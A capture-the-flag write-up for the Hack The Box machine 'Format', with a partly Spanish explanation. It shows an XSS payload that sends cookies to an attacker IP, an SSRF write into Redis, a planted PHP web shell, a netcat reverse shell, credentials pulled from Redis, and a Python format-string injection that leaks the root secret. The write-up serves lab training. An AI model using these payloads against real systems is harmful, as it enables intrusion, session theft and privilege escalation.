---
tags:
title: Format - Medium (HTB)
permalink: /Format-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmap -sCV -p22,80,3000 10.129.229.3
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-18 13:29 -0500
Nmap scan report for app.microblog.htb (10.129.229.3)
Host is up (0.63s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey:
|   3072 c3:97:ce:83:7d:25:5d:5d:ed:b5:45:cd:f2:0b:05:4f (RSA)
|   256 b3:aa:30:35:2b:99:7d:20:fe:b6:75:88:40:a5:17:c1 (ECDSA)
|_  256 fa:b3:7d:6e:1a:bc:d1:4b:68:ed:d6:e8:97:67:27:d7 (ED25519)
80/tcp   open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
|_http-title: Microblog
3000/tcp open  http    nginx 1.18.0
|_http-title: Did not follow redirect to http://microblog.htb:3000/
|_http-server-header: nginx/1.18.0
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 46.71 seconds
```

```bash
addhost 10.129.229.3 app.microblog.htb
[+] Added new entry: 10.129.229.3 app.microblog.htb to /etc/hosts
10.129.229.3 app.microblog.htb
```

## Website 

![[Pasted image 20260218153222.png]]

![[Pasted image 20260218153932.png]]

![[Pasted image 20260218153256.png]]

![[Pasted image 20260218153325.png]]

![[Pasted image 20260218153338.png]]

![[Pasted image 20260218153432.png]]

![[Pasted image 20260218153509.png]]

![[Pasted image 20260218153519.png]]

```bahs
<script src="http://10.10.17.19/xss.js"></script>
```

```bash
www
[eth0] 192.168.100.8
[docker0] 172.17.0.1
[br-427beff723d7] 172.18.0.1
[tun0] 10.10.17.19
[/home/zsln/Desktop/zsln/Format]
allPorts  port_scan
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.17.19 - - [18/Feb/2026 13:36:00] code 404, message File not found
10.10.17.19 - - [18/Feb/2026 13:36:00] "GET /xss.js HTTP/1.1" 404 -
```

```javascript
x = new XMLHttpRequest();
x.open("GET", "http://10.10.17.19/?resp=" + document.cookie);
x.send()
```


```bash
 www
[eth0] 192.168.100.8
[docker0] 172.17.0.1
[br-427beff723d7] 172.18.0.1
[tun0] 10.10.17.19
[/home/zsln/Desktop/zsln/Format]
allPorts  port_scan  xss.js
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.17.19 - - [18/Feb/2026 13:37:36] "GET /xss.js HTTP/1.1" 200 -
10.10.17.19 - - [18/Feb/2026 13:37:36] "GET /?resp=username=6g7u4ghvth2fu6u9716brrotnq HTTP/1.1" 200 -
10.10.17.19 - - [18/Feb/2026 13:37:36] "GET /xss.js HTTP/1.1" 200 -
10.10.17.19 - - [18/Feb/2026 13:37:41] "GET /xss.js HTTP/1.1" 200 -
```

```php
<?php
$username = session_name("username");
session_set_cookie_params(0, '/', '.microblog.htb');
session_start();
if(file_exists("bulletproof.php")) {
    require_once "bulletproof.php";
}

if(is_null($_SESSION['username'])) {
    header("Location: /");
    exit;
}

function checkUserOwnsBlog() {
    $redis = new Redis();
    $redis->connect('/var/run/redis/redis.sock');
    $subdomain = array_shift((explode('.', $_SERVER['HTTP_HOST'])));
    $userSites = $redis->LRANGE($_SESSION['username'] . ":sites", 0, -1);
    if(!in_array($subdomain, $userSites)) {
        header("Location: /");
        exit;
    }
}

function provisionProUser() {
    if(isPro() === "true") {
        $blogName = trim(urldecode(getBlogName()));
        system("chmod +w /var/www/microblog/" . $blogName);
        system("chmod +w /var/www/microblog/" . $blogName . "/edit");
        system("cp /var/www/pro-files/bulletproof.php /var/www/microblog/" . $blogName . "/edit/");
        system("mkdir /var/www/microblog/" . $blogName . "/uploads && chmod 700 /var/www/microblog/" . $blogName . "/uploads");
        system("chmod -w /var/www/microblog/" . $blogName . "/edit && chmod -w /var/www/microblog/" . $blogName);
    }
    return;
}

//always check user owns blog before proceeding with any actions
checkUserOwnsBlog();

//provision pro environment for new pro users
provisionProUser();

//delete section
if(isset($_POST['action']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $contents = file_get_contents("order.txt");
    $contents = str_replace($_POST['id'] . "\n", '', $contents);
    file_put_contents("order.txt", $contents);

    //delete image file if content is image
    $data = file_get_contents($_POST['id']);
    $img_check = substr($data, 0, 26);
    if($img_check === "<div class = \"blog-image\">") {
        $startsAt = strpos($data, "<img src = \"/uploads/") + strlen("<img src = \"/uploads/");
        $endsAt = strpos($data, "\" /></div>", $startsAt);
        $fileToDelete = substr($data, $startsAt, $endsAt - $startsAt);
        chdir(getcwd() . "/../uploads");
        $file_pointer = $fileToDelete;
        unlink($file_pointer);
        chdir(getcwd() . "/../content");
    }
    $file_pointer = $_POST['id'];
    unlink($file_pointer);
    return "Section deleted successfully";
}

//add header
if (isset($_POST['header']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $html = "<div class = \"blog-h1 blue-fill\"><b>{$_POST['header']}</b></div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}

//add text
if (isset($_POST['txt']) && isset($_POST['id'])) {
    chdir(getcwd() . "/../content");
    $txt_nl = nl2br($_POST['txt']);
    $html = "<div class = \"blog-text\">{$txt_nl}</div>";
    $post_file = fopen("{$_POST['id']}", "w");
    fwrite($post_file, $html);
    fclose($post_file);
    $order_file = fopen("order.txt", "a");
    fwrite($order_file, $_POST['id'] . "\n");  
    fclose($order_file);
    header("Location: /edit?message=Section added!&status=success");
}

//add image
if (isset($_FILES['image']) && isset($_POST['id'])) {
    if(isPro() === "false") {
        print_r("Pro subscription required to upload images");
        header("Location: /edit?message=Pro subscription required&status=fail");
        exit();
    }
    $image = new Bulletproof\Image($_FILES);
    $image->setLocation(getcwd() . "/../uploads");
    $image->setSize(100, 3000000);
    $image->setMime(array('png'));

    if($image["image"]) {
        $upload = $image->upload();

        if($upload) {
            $upload_path = "/uploads/" . $upload->getName() . ".png";
            $html = "<div class = \"blog-image\"><img src = \"{$upload_path}\" /></div>";
            chdir(getcwd() . "/../content");
            $post_file = fopen("{$_POST['id']}", "w");
            fwrite($post_file, $html);
            fclose($post_file);
            $order_file = fopen("order.txt", "a");
            fwrite($order_file, $_POST['id'] . "\n");  
            fclose($order_file);
            header("Location: /edit?message=Image uploaded successfully&status=success");
        }
        else {
            header("Location: /edit?message=Image upload failed&status=fail");
        }
    }
}

function isPro() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $pro = $redis->HGET($_SESSION['username'], "pro");
        return strval($pro);
    }
    return "false";
}

function getBlogName() {
    return '"' . array_shift((explode('.', $_SERVER['HTTP_HOST']))) . '"';
}

function getFirstName() {
    if(isset($_SESSION['username'])) {
        $redis = new Redis();
        $redis->connect('/var/run/redis/redis.sock');
        $firstName = $redis->HGET($_SESSION['username'], "first-name");
        return "\"" . ucfirst(strval($firstName)) . "\"";
    }
}

function fetchPage() {
    chdir(getcwd() . "/../content");
    $order = file("order.txt", FILE_IGNORE_NEW_LINES);
    $html_content = "";
    foreach($order as $line) {
        $temp = $html_content;
        $html_content = $temp . "<div class = \"{$line} blog-indiv-content\">" . file_get_contents($line) . "</div>";
    }
    return $html_content;
}

?>
<!DOCTYPE html>
<head>
<link rel="icon" type="image/x-icon" href="/images/brain.ico">
<link rel="stylesheet" href="http://microblog.htb/static/css/styles.css">
<script src="http://microblog.htb/static/js/jquery.js"></script>
<script src="http://microblog.htb/static/js/fontawesome.js"></script>
<title></title>
<script>
    $(window).on('load', function(){
        const queryString = window.location.search;
        if(queryString) {
            const urlParams = new URLSearchParams(queryString);
            if(urlParams.get('message') && urlParams.get('status')) {
                const status = urlParams.get('status')
                const message = urlParams.get('message')
                $(".floating-message").css("display", "block");
                $(".floating-message").children(".message-content").text(message);
                if(status === "fail") {
                    $(".floating-message").css("background-color", "#AF0606");
                }
                else {
                    $(".floating-message").css("background-color", "#4BB543");
                }
            }
        }
        const pro = <?php echo isPro(); ?>;
        if(!pro) {
            $(".pro").css("display", "none");
            $("#img-dot").css("display", "none");
        }
        const html = <?php echo json_encode(fetchPage()); ?>.replace(/(\r\n|\n|\r)/gm, "");
        $(".push-for-h1").after(html);
        $(".user-first-name").text(<?php echo getFirstName(); ?>);
        $(".blog-name").text(<?php echo getBlogName(); ?>);
        const class_after_push = $(".push-for-h1").next().children().attr('class');
        if(class_after_push) {
            if(class_after_push.includes("blog-h1")) {
                $(".push-for-h1").css("display", "none");
            }
        }
        const placeholders = ["Today, I learned to...", "You won't believe what happened! I went...", "My name is...", "On today's adventure in the park, I...", "Well, it finally happened..."];
        $(".txt-form-input").attr("placeholder", placeholders.sort(() => 0.5 - Math.random())[0]);
        $(".form-id").attr("value", Math.random().toString(36).slice(2));

        //image upload
        const actualBtn = document.getElementById('actual-btn');
        const fileChosen = document.getElementById('file-chosen');
        actualBtn.addEventListener('change', function(){
            fileChosen.textContent = this.files[0].name
        })

        //add delete buttons
        $('.blog-indiv-content').each(
            function() {
                $(this).prepend("<i class=\"fa fa-trash delete-button\" onclick=delete_section(this)></i>");
            }
        )

        const blogName = String(window.location).split('.')[0].split('//')[1]
        document.title = blogName + " - edit - Microblog"
        $(".blog-name").attr("href", "http://"+blogName+".microblog.htb")
    });
</script>
<script>
    function showForm(name) {
        //reset selected options
        $(".dot").removeClass("dotSelected");
        $(".component-form").css("display", "none");
        $(".dot").css("background", "#CA776D");

        $(`#${name}-dot`).addClass("dotSelected");
        $(".dot").hover(
            function() {
                if(!$(this).hasClass("dotSelected")) {
                    $(this).css("background", "#e4aaa3")
                }
            },
            function() {
                if(!$(this).hasClass("dotSelected")) {
                    $(this).css("background", "#CA776D")
                }
            }
        )
        $(`#${name}-form`).css("display", "block");
        $(`#${name}-dot`).css("background", "#e4aaa3");
    }
</script>
<script>
    function delete_section(section) {
        const id = $(section).parent().attr('class').split(" ")[0]
        $.ajax({
            type: "POST",
            url: "/edit/index.php",
            data: {"action":"delete","id":id},
            success: function() {
                window.location.replace("/edit?message=Section deleted&status=success");
            }
        })
    }
</script>
</head>
<body>
    <div class="floating-message">
        <span class="message-content" style = "margin-right: 10px"></span>
        <span class="closebtn" style = "font-weight: bold;" onclick="this.parentElement.style.display='none';">&times;</span>
    </div>
    <div class = "blue-fill" style = "border-bottom: 2px solid; padding-bottom: 25px;">
        <div class="navbar" style = "overflow: inherit;">
            <a href="http://app.microblog.htb" class="float-left title">Microblog</a>
            <div class = "float-right select-buttons">
                <span class = "pro"><i class="fa fa-star gold"></i>&nbsp;&nbsp;<span class = "gold">Pro</span></span>
                <div class = "menu-button hello-text">Hello, <span class = "user-first-name"></span></div>
                <a href="http://app.microblog.htb/dashboard" class = "menu-button">Dashboard</a>
                <a href="http://app.microblog.htb/logout" class = "menu-button">Logout</a>
            </div>
        </div>
        <div class = "header-content-item">
            <span class = "big-text heading">Edit Blog</span>
            <a class = "blog-name" style = "font-size: 25px; text-align: center; top: -20px; position: relative; display: block; margin-left: auto; margin-right: auto; width: min-content;"></a>
        </div>
    </div>
    <div class = "push-for-h1" style = "min-height: 25px;"></div>
    <div class = "component-selector">
        <div class = "links">
            <a class = "dot" id = "h1-dot" onclick="showForm('h1')">h1</a>
            <a class = "dot" id = "txt-dot" onclick="showForm('txt')">txt</a>
            <a class = "dot" id = "img-dot" onclick="showForm('img')">img</a>
        </div>
    </div>
    <form action="<?=$_SERVER['PHP_SELF']?>" method="POST" class = "component-form" id = "h1-form">
        <input class = "form-id" name = "id" type="hidden"/>
        <input name = "header" type = "text" placeholder = "Header" required>
        <input type = "submit" value="Post">
    </form>
    <form action="<?=$_SERVER['PHP_SELF']?>" method="POST" class = "component-form" id = "txt-form">
        <input class = "form-id" name = "id" type="hidden"/>
        <textarea name = "txt" form="txt-form" class = "txt-form-input" required></textarea>
        <input type = "submit" value="Post">
    </form>
    <form action="<?=$_SERVER['PHP_SELF']?>" method="POST" class = "component-form" id = "img-form" enctype="multipart/form-data">
        <div class = "image-upload-outer">
            <input class = "form-id" name = "id" type="hidden"/>
            <input type="file" id="actual-btn" name="image" accept="image/png" hidden required/>
            <label class = "select-image-label pink-fill" for="actual-btn">Select Image</label>
            <span id="file-chosen">No image selected</span>
        </div>
        <p></p>
        <input type = "submit" value="Upload">
    </form>
    <footer>
        © 2022 Microblog<br/>
        <a href="https://www.vecteezy.com/free-vector/brain">Brain Vectors by Vecteezy</a>
    </footer>
</body>
</html>
```

![[Pasted image 20260218155537.png]]


![[Pasted image 20260218155506.png]]

```bash
id=/var/www/microblog/test/content/bad.php&header=<?php print_r("cmd");?>
```

![[Pasted image 20260218161236.png]]

```bash
http://microblog.htb/static/unix:%2fvar%2frun%2fredis%2fredis.sock:%20zsln%20pro%20true%0atest
```

![[Pasted image 20260218163043.png]]

![[Pasted image 20260218162936.png]]

![[Pasted image 20260218163403.png]]

```bash
id=/var/www/microblog/test/uploads/shell.php&header=<?php+system($_GET[0]);?>
```

![[Pasted image 20260218164044.png]]

![[Pasted image 20260218164035.png]]

```bash
nc -nlvp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.3] 40438
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

```bash
www-data@format:/home$ ss -tulpn
Netid State  Recv-Q Send-Q Local Address:Port Peer Address:PortProcess
udp   UNCONN 0      0            0.0.0.0:68        0.0.0.0:*
tcp   LISTEN 0      4096       127.0.0.1:9000      0.0.0.0:*
tcp   LISTEN 0      511          0.0.0.0:80        0.0.0.0:*    users:(("nginx",pid=636,fd=6),("nginx",pid=634,fd=6))
tcp   LISTEN 0      128          0.0.0.0:22        0.0.0.0:*
tcp   LISTEN 0      511          0.0.0.0:3000      0.0.0.0:*    users:(("nginx",pid=636,fd=8),("nginx",pid=634,fd=8))
tcp   LISTEN 0      511             [::]:80           [::]:*    users:(("nginx",pid=636,fd=7),("nginx",pid=634,fd=7))
tcp   LISTEN 0      128             [::]:22           [::]:*
tcp   LISTEN 0      511             [::]:3000         [::]:*    users:(("nginx",pid=636,fd=9),("nginx",pid=634,fd=9))
```

```bash
www-data@format:/home$ redis-cli -s /var/run/redis/redis.sock
redis /var/run/redis/redis.sock>
redis /var/run/redis/redis.sock> KEYS *
1) "cooper.dooper:sites"
2) "zsln"
3) "PHPREDIS_SESSION:ghvu89246iurifhvl773f3597a"
4) "zsln:sites"
5) "cooper.dooper"
6) "PHPREDIS_SESSION:bvqihp85ra8citfi2ku2mgo4k3"
7) "PHPREDIS_SESSION:6g7u4ghvth2fu6u9716brrotnq"
```

```bash
redis /var/run/redis/redis.sock> HGETALL cooper.dooper
 1) "username"
 2) "cooper.dooper"
 3) "password"
 4) "zooperdoopercooper"
 5) "first-name"
 6) "Cooper"
 7) "last-name"
 8) "Dooper"
 9) "pro"
10) "false"
```

```bash
sudo ssh cooper@microblog.htb
The authenticity of host 'microblog.htb (10.129.229.3)' can't be established.
ED25519 key fingerprint is: SHA256:30cTQN6W3DKQMMwb5RGQA6Ie1hnKQ37/bSbe+vpYE98
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added 'microblog.htb' (ED25519) to the list of known hosts.
** WARNING: connection is not using a post-quantum key exchange algorithm.
** This session may be vulnerable to "store now, decrypt later" attacks.
** The server may need to be upgraded. See https://openssh.com/pq.html
cooper@microblog.htb's password:
Linux format 5.10.0-22-amd64 #1 SMP Debian 5.10.178-3 (2023-04-22) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Mon May 22 20:40:36 2023 from 10.10.14.40
cooper@format:~$ cat user.txt
bb5c68753a2f7b7f84263ffed1c634d3
```

```bash
cooper@format:~$ sudo -l
[sudo] password for cooper:
Sorry, try again.
[sudo] password for cooper:
Matching Defaults entries for cooper on format:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User cooper may run the following commands on format:
    (root) /usr/bin/license
```

```python
cooper@format:~$ cat /usr/bin/license
#!/usr/bin/python3

import base64
from cryptography.hazmat.backends import default_backend
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.fernet import Fernet
import random
import string
from datetime import date
import redis
import argparse
import os
import sys

class License():
    def __init__(self):
        chars = string.ascii_letters + string.digits + string.punctuation
        self.license = ''.join(random.choice(chars) for i in range(40))
        self.created = date.today()

if os.geteuid() != 0:
    print("")
    print("Microblog license key manager can only be run as root")
    print("")
    sys.exit()

parser = argparse.ArgumentParser(description='Microblog license key manager')
group = parser.add_mutually_exclusive_group(required=True)
group.add_argument('-p', '--provision', help='Provision license key for specified user', metavar='username')
group.add_argument('-d', '--deprovision', help='Deprovision license key for specified user', metavar='username')
group.add_argument('-c', '--check', help='Check if specified license key is valid', metavar='license_key')
args = parser.parse_args()

r = redis.Redis(unix_socket_path='/var/run/redis/redis.sock')

secret = [line.strip() for line in open("/root/license/secret")][0]
secret_encoded = secret.encode()
salt = b'microblogsalt123'
kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))

f = Fernet(encryption_key)
l = License()

#provision
if(args.provision):
    user_profile = r.hgetall(args.provision)
    if not user_profile:
        print("")
        print("User does not exist. Please provide valid username.")
        print("")
        sys.exit()
    existing_keys = open("/root/license/keys", "r")
    all_keys = existing_keys.readlines()
    for user_key in all_keys:
        if(user_key.split(":")[0] == args.provision):
            print("")
            print("License key has already been provisioned for this user")
            print("")
            sys.exit()
    prefix = "microblog"
    username = r.hget(args.provision, "username").decode()
    firstlast = r.hget(args.provision, "first-name").decode() + r.hget(args.provision, "last-name").decode()
    license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)
    print("")
    print("Plaintext license key:")
    print("------------------------------------------------------")
    print(license_key)
    print("")
    license_key_encoded = license_key.encode()
    license_key_encrypted = f.encrypt(license_key_encoded)
    print("Encrypted license key (distribute to customer):")
    print("------------------------------------------------------")
    print(license_key_encrypted.decode())
    print("")
    with open("/root/license/keys", "a") as license_keys_file:
        license_keys_file.write(args.provision + ":" + license_key_encrypted.decode() + "\n")

#deprovision
if(args.deprovision):
    print("")
    print("License key deprovisioning coming soon")
    print("")
    sys.exit()

#check
if(args.check):
    print("")
    try:
        license_key_decrypted = f.decrypt(args.check.encode())
        print("License key valid! Decrypted value:")
        print("------------------------------------------------------")
        print(license_key_decrypted.decode())
    except:
        print("License key invalid")
    print("")
```

### . El Punto de Entrada (Redis)

El script de licencias (`/usr/bin/license`) es un programa que **root** permite ejecutar a usuarios normales. Este script hace lo siguiente:

1. Se conecta a la base de datos **Redis**.
    
2. Busca los datos de un usuario (como `cooper.dooper` o `pwn2`).
    
3. Crea una "llave de licencia" mezclando el nombre del usuario con otros datos.
    

### 2. La Vulnerabilidad: Inyección de Formateo

Aquí es donde ocurre la magia (y el error). El script tiene esta línea: `license_key = (prefix + username + "{license.license}" + firstlast).format(license=l)`

- **`firstlast`** es una variable que el script construye uniendo el `first-name` y `last-name` que saca de **Redis**.
    
- **`.format(license=l)`** es una función de Python que busca cualquier cosa entre llaves `{...}` y trata de reemplazarla con datos del objeto `license`.
    

**El problema:** Como tú puedes escribir en Redis, puedes poner llaves `{}` en tu nombre. Cuando el script lee tu nombre de Redis y lo pasa por `.format()`, Python no sabe que esas llaves son "tu nombre", piensa que son **instrucciones** para buscar más datos.

---

### 3. La Introspección (Buscando el secreto)

Python permite "navegar" por los objetos. Al usar un payload como: `{license.__init__.__globals__}`

Le estamos diciendo al script:

1. Mira el objeto **`license`**.
    
2. Ve a su función de inicio (**`__init__`**).
    
3. Accede a todas las variables globales que tiene ese script en memoria (**`__globals__`**).
    

Como el script ya leyó el archivo secreto de root y lo guardó en una variable llamada `secret`, nosotros simplemente le pedimos al formateador de Python que nos lo imprima como si fuera parte de nuestro nombre.

---

### 4. Por qué falló el primer intento y funcionó el segundo

- **Fallo con `cooper.dooper`:** El script tiene una lista negra. Si ya existe una licencia para ese nombre en `/root/license/keys`, se detiene. Por eso tuvimos que crear un usuario nuevo en Redis (como `pwn2`).
    
- **Éxito con `pwn2`:** Como `pwn2` no estaba en la lista de licencias, el script siguió adelante, procesó nuestro nombre falso, encontró las llaves `{...}`, buscó en la memoria de root y nos escupió el secreto: `unCR4ckaBL3Pa$$w0rd`.

```bash
cooper@format:~$ redis-cli -s /var/run/redis/redis.sock
redis /var/run/redis/redis.sock> HMSET pwn2 username pwn2 password pass first-name "{license.__init__.__globals__[secret]}" last-name "pwn" pro false
OK
redis /var/run/redis/redis.sock> exit
cooper@format:~$ sudo /usr/bin/license -p pwn2

Plaintext license key:
------------------------------------------------------
microblogpwn2lX`q|P,S^A.s<M1yD8_69zida@B@u3:lch}LPwC\unCR4ckaBL3Pa$$w0rdpwn

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABplhhwLhyBbFxp9rYEAVuFn0u9i0TceRYWLnawRPwMA6mhA9xzjb7vXrkYVzFKq2Y_-aif-xHDLU3naXJjpJLNBjEAO1bCzRJGdHZgUxvOidqBwFGx5WXalr7O5vPVxotGofTjtf11KSlpg7kuNp8heYRmQgWZ39fEwnnT9prwsLPhSxA=
```

```bash
microblogpwn2lX`q|P,S^A.s<M1yD8_69zida@B@u3:lch}LPwC\unCR4ckaBL3Pa$$w0rdpwn

Encrypted license key (distribute to customer):
------------------------------------------------------
gAAAAABplhhwLhyBbFxp9rYEAVuFn0u9i0TceRYWLnawRPwMA6mhA9xzjb7vXrkYVzFKq2Y_-aif-xHDLU3naXJjpJLNBjEAO1bCzRJGdHZgUxvOidqBwFGx5WXalr7O5vPVxotGofTjtf11KSlpg7kuNp8heYRmQgWZ39fEwnnT9prwsLPhSxA=

cooper@format:~$ su root
Password:
su: Authentication failure
cooper@format:~$ su root
Password:
root@format:/home/cooper# cd /root/
root@format:~# cat root.txt
bbfe2588f15483a7917df60370f8c8f0
```